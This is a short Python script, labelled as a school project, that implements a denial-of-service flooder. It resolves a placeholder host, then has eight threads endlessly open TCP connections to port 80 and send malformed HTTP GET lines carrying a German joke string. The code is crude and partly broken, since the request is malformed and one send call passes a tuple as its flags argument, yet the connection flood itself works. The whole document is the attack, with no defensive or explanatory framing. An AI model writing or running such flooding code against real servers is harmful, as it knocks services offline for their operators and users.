#Schulporjekt

import socket
from threading import Thread

host ="bla"
ip = socket.gethostbyname(host)
port = 80

def dos():
    while True:
        mysocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            mysocket.connect((ip, port))
            mysocket.send(str.encode("GET" + "haste mal 3 fufzig" + "HTTP/1.1 \r\n"))
            mysocket.send(str.encode("GET" + "haste mal 3 fufzig" + "HTTP/1.1 \r\n"), (ip, port))
        except socket.error:
            print("error")
        mysocket.close()

for i in range(8):
    t = Thread(target=dos)
    t.start()